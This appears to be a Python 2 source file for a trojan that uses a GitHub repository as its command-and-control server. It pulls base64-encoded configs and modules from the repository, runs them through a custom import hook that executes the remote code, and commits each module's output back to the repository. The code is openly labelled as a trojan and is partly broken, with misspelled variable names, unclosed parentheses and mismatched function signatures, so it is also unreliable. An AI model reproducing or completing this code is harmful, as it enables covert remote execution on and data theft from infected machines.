import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os
import _____
from github3 import login


"""
	TODO:
        - optimize away the apply config
"""


task_queue = Queue.Queue()

class HubHandler:
    """ 
        Class for handling GitHub connections
          fetching modules, saving data,
          loading configs
    """

    def __init__(self, username, password):
        self.trojan_id = "abc"
        self.username = username
	
        self.trojan_config = "config/%s.json" % self.trojan_id
        self.data_path = "data/%s/" % self.trojan_id
        self.trojan_modules = []
        self.configured = False

        self.ghandle, self.repo, self.branch = self.connect(self.username, password)

    def connect(self, p):
        " Connect to github and get the repository "
        gh = login(username=self.username, password=p)
        repo = gh.repository(self.username,"codename-seniorita")
        branch = repo.branch("master")
        return gh, repo, branch


    def get_file(self, filepath):
        tree = self.branch.commit.commit.tree.recurse()

        for filename in tree.tree:
            if filepath in filename.path:
                print("[*] Found file %s" % filepath)
                blob = repo.blob(filename._json_data['sha'])
                return blob.content
        return None

    def apply_config(self):
       # maybe this could be optiized away and store config in object
       config_json = get_file(self.trojan_config)
       config = json.loads(base64.b64decode(config_json))
       self.configured = True
       for task in config:
           if task['module'] not in sys.modules:
               exec("import %s" % task['module'])
       return config

    def store_module_result(self, data):
        remote_path = "data/%s/%d.data" % (self.trojan_id, random.randint(1000, 100000))
        self.repo.create_file(remote_path, "commit message", base64.b64encode(data))

class GitImporter:
    " Load module from GitHub "

    def __init__(self, ghandle):
        self.current_module_code = ""
        self.ghandle = ghandle

    def find_module(self, fullname, path=None):
        if ghandle.configured:
            print("[*] Attempting to retreive %s" % fullname)
            new_library = ghandle.get_file("modules/%s" % fullname)
            if new_library is not None:
                self.current_module_code = base64.b64decode(new_library)
                return self
        return None

    def load_module(self, name):
        module = imp.new_module(name)
        exec(self.current_module_code in module.__dict__)
        sys.modules[name] = module
        return module

def module_runner(module, ghanlde, queue=task_queue):
    queue.put(1)
    result = sys.modules[module].run()
    queue.get()
    ghandle.store_module_result(result)


ghanlde = HubHandler("hero24", _____.______________) 
sys.meta_path = [GitImporter(ghandlee)]

while True:
    if task_queue.empty():
        config = ghandle.apply_config()
    for task in config:
        t = threading.Thread(target=module_runner, args=(task['module'], ghandle, task_queue)
        t.start()
        time.sleep(random.randint(1,10))
    time.sleep(random.randint(1000, 100000)
